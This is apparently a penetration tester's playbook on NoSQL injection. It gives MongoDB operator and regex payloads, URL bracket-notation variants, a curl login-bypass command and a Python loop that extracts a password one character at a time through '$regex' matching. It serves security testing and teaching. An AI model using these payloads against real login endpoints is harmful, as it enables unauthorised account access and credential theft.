# NoSQL injection — playbook

## when to try
- App stack uses MongoDB, CouchDB, Cassandra, Elasticsearch, DynamoDB, Redis (yes, Redis).
- Tells: `_id` ObjectId-shaped (24 hex), Express.js + Mongoose, lots of JSON
  bodies, `$gt`, `$ne` showing up in client code, no SQL keywords in errors.

## bug archetypes
- **Operator injection** (Mongo, JSON body):
  ```json
  {"username":"admin","password":{"$ne":null}}
  ```
  Login bypasses.
- **Operator injection** (URL params, Express query parser):
  `?username=admin&password[$ne]=`
  Same effect — Express parses bracket-notation as object.
- **JS injection** (Mongo `$where`): `"$where":"this.password.length > 0"` → blind extraction by length comparison.
- **Regex injection**: `{"username":{"$regex":"^a"}}` → enumerate by char.
- **Aggregation/evaluation endpoints**: `$function` (Mongo 4.4+), `eval` in Couch.
- **Elasticsearch script injection**: `script_fields` with painless script.

## confirmation flow
1. Submit a valid login. Capture body shape.
2. Replace password with operator: `{"$ne":null}` or `{"$gt":""}`.
3. If 200 returned and you're authenticated, confirmed.
4. If only error: try URL form (`password[$regex]=^a`).

## exploitation snippet
Auth bypass:
```bash
curl -sk -X POST https://t/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":null}}'
```

Regex char-by-char:
```python
import string, requests
known=""
while True:
    for c in string.printable:
        r=requests.post("https://t/api/login", json={"username":"administrator","password":{"$regex":f"^{known+c}.*"}})
        if r.status_code==200: known+=c; print(known); break
    else: break
```

## caveats
- Many MongoDB drivers >= 4.0 reject query selectors in user input by default. Check the framework defaults.
- A 200 response with 0 results is NOT a hit — check that you actually got a session cookie / valid token.

## provenance
PortSwigger NoSQL labs. CVE-2017-7273 (express-mongo-sanitize related).
